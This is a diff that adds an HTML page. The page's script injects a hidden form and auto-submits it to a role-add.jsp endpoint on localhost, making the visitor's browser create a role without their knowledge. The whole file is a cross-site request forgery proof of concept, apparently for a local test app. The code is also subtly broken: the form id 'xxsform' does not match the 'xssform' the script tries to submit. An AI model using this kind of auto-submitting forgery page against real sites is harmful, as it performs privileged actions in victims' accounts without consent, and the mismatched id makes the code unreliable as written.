@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+
+<script>
+    var dd = document.createElement("div");
+    document.body.appendChild(dd);
+    dd.innerHTML='<form action="http://localhost:8888/pages/role-add.jsp" method="post" id="xxsform" name="mbform">\n' +
+        '    <input type="hidden" value="nihao" name="roleName">\n' +
+        '    <input type="hidden" value="share" name="roleDesc">\n' +
+        '</form>'
+    document.getElementById("xssform").submit();
+</script>
+
+
+</body>
+</html>
